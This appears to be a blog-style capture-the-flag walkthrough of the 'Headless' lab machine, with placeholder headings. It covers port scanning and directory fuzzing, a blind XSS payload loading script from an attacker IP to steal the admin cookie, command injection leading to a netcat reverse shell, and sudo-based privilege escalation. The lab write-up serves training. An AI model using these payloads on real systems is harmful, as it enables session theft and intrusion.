---
title: "test"
date: 2025-01-21 00:00:00 +0800
categories: [test, testing]
tags: [hacker, news, things]
image: /assets/img/Pasted image 20240614174227.png
alt: "image alt text"
---

## title1

i started a simple scan with nmap to determine open ports 
```bash
nmap 10.10.11.8 -oN nmap.txt -vvv
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-14 10:35 EDT
Initiating Ping Scan at 10:35
Scanning 10.10.11.8 [2 ports]
Completed Ping Scan at 10:35, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:35
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Completed Parallel DNS resolution of 1 host. at 10:35, 4.05s elapsed
DNS resolution of 1 IPs took 4.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 2, CN: 0]
Initiating Connect Scan at 10:35
Scanning 10.10.11.8 [1000 ports]
Discovered open port 22/tcp on 10.10.11.8
Discovered open port 5000/tcp on 10.10.11.8
Completed Connect Scan at 10:35, 2.90s elapsed (1000 total ports)
Nmap scan report for 10.10.11.8
Host is up, received conn-refused (0.069s latency).
Scanned at 2024-06-14 10:35:49 EDT for 3s
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
5000/tcp open  upnp    syn-ack
```

## title 2

so after know open ports i start another scan but this time specifying open ports 
```bash
nmap -p5000,22 -sCV 10.10.11.8   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-14 10:40 EDT
Nmap scan report for 10.10.11.8
Host is up (0.064s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Fri, 14 Jun 2024 14:40:31 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=6/14%Time=666C565F%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.11\.2\r\nDate:\x20Fri,\x2014\x20Jun\x202024\x2014:40:31\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Z
SF:fs;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\
SF:x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\
SF:x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wid
SF:th,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construct
SF:ion</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20b
SF:ody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\
SF:x20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20di
SF:splay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justif
SF:y-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x20
SF:0,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYP
SF:E\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x
SF:20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20resp
SF:onse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20vers
SF:ion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\
SF:x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x
SF:20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## title 3

we have just 2 open ports one is SSH and another in upnp and there is a web site hosting after enumerating manullay web page and source code i did not find anything interssting so a fuzz direcotries using `feroxbuster` 

```bash
feroxbuster -u http://10.10.11.8:5000/                                                                              
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.8:5000/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       93l      179w     2363c http://10.10.11.8:5000/support
200      GET       96l      259w     2799c http://10.10.11.8:5000/
500      GET        5l       37w      265c http://10.10.11.8:5000/dashboard
[####################] - 81s    30001/30001   0s      found:3       errors:0      
[####################] - 81s    30000/30000   371/s   http://10.10.11.8:5000/ 
```
there is a dashboard page so if we send request we will get error 
```bash
curl http://10.10.11.8:5000/dashboard
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>

```
this is the home page
![[Pasted image 20240622170516.png]]
after clicking in for question it lead to this path support
![[Pasted image 20240622170601.png]]

 i notice when sending `<>` tags
 ![[Pasted image 20240622170705.png]]
  it's will display hacking attempt detected
  ![[Pasted image 20240622170727.png]]
 so i decide to use this tag `<script src="http://OUR_IP/script.js"></script>` with you server web ip address (like running python server) i got a response from the server so it's vulnerable to xss blind injection so let's use this tag to steal admin session cookie and i run i python server with the command `python -m http.server 80`
![[Pasted image 20240614175153.png]]
and i got session cookies of the admin
```bash
┌──(kali㉿kali)-[~/…/ctf/htb/app/Headless]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.16.36 - - [14/Jun/2024 11:15:54] "GET /?cookie= HTTP/1.1" 200 -
10.10.11.8 - - [14/Jun/2024 11:16:17] "GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -
```
let's decode 
```
┌──(kali㉿kali)-[~/…/ctf/htb/app/Headless]
└─$ echo 'aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=' |base64 -d
is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0  
```
let's use this session cookie in our browser or in burp suit and this is the admin page
![[Pasted image 20240614175210.png]]
if we intercept the generated report with burp suit and add and OS command it's will be executed so i generate and reversehell code 
![[Pasted image 20240614175135.png]]

and i start my listener with the same port of the shell
```
┌──(kali㉿kali)-[~/…/ctf/htb/app/Headless]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.36] from (UNKNOWN) [10.10.11.8] 47590
bash: cannot set terminal process group (1351): Inappropriate ioctl for device
bash: no job control in this shell
````
as you see we got shell as user dvir 
```
dvir@headless:~/app$ ls
ls
app.py
dashboard.html
hackattempt.html
hacking_reports
index.html
initdb.sh
inspect_reports.py
report.sh
support.html
````
so i download linpeas on this machine and after run it i found this hint
![[Pasted image 20240614175118.png]]
so we can run `syscheck` as root without needing root password
```
dvir@headless:~$ sudo /usr/bin/syscheck /bin/bash -p
sudo /usr/bin/syscheck /bin/bash -p
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.8G
System load average:  0.08, 0.45, 0.47
Database service is not running. Starting it...
id

```
